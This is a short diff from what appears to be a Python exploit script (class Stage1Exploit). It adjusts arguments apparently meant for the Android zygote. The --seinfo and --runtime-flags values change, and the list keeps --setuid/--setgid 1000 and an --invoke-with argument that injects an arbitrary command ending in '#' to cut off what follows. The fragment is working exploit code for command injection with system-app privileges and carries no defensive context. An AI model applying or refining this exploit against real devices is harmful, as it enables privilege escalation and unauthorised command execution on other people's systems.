@@ -192,8 +192,8 @@ class Stage1Exploit:
             "--runtime-args",
             "--setuid=1000",
             "--setgid=1000",
-            "--seinfo=platform:system_app:targetSdkVersion=28:complete",
-            "--runtime-flags=43267",
+            "--seinfo=platform:system_app:complete",
+            "--runtime-flags=2049",
             "--invoke-with",
             f"{command}#",
         ]
